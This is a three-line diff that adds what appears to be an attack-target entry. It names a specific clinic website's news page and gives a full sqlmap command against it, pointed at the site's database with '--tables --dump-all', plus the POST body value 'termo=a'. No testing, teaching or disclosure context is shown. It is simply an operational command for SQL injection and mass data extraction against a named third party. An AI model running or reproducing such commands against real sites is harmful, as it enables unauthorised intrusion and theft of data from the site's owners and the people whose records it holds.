@@ -1,0 +1,3 @@
+https://www.audiclinic.com.br/noticias-detalhes.php?id=140 (POST)  # sqlmap.py -u https://www.audiclinic.com.br/noticias-detalhes.php?id=140 --data termo=a -D audiclinic --tables --dump-all --threads 5 -v3
+
+termo=a
